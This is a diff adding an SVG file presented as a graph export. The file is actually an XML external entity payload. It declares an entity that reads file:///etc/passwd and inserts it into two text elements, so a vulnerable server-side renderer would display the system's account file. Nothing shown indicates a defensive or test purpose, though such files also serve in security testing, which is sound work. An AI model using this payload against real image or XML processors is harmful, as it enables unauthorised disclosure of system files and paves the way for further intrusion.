@@ -1,0 +1,22 @@
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
+<svg
+        xmlns="http://www.w3.org/2000/svg" width="1000" height="1000"
+        xmlns:xlink="http://www.w3.org/1999/xlink" joint-selector="svg" id="v-34"
+        class="graph-export">
+    <defs>
+        <!-- define lines for text lies on -->
+        <path id="path1" d="M10,30 H800 M10,60 H800 M110,90 H800 M10,120 H800 M10,150
+H800 M10,180 H800 M10,210 H800 M10,240 H800 M10,270 H800 M10,300 H800 M10,330
+H800 M10,360 H800 M10,390 H800 M10,420 H800 M10,450 H800 M10,480 H800 M10,510
+H800 M10,540 H800 M10,580 H800 M10,600 H800 M10,650 H800 M10,700 H800 M10,750
+H800 M10,800 H800 M10,850 H800 M10,900 H800 M10,1000 H800"></path>
+    </defs>
+    <text transform="translate(0,35)" fill="black" font-size="35">
+        <textPath xlink:href="#path1">&ent;</textPath>
+    </text>
+    <text x="" y="20" fill="#1E1E1E" font-size="16" pointer-events="none" font-
+          weight="400" joint-selector="content" id="v-45" xml:space="preserve" opacity="1">
+&ent;
+</text>
+</svg>
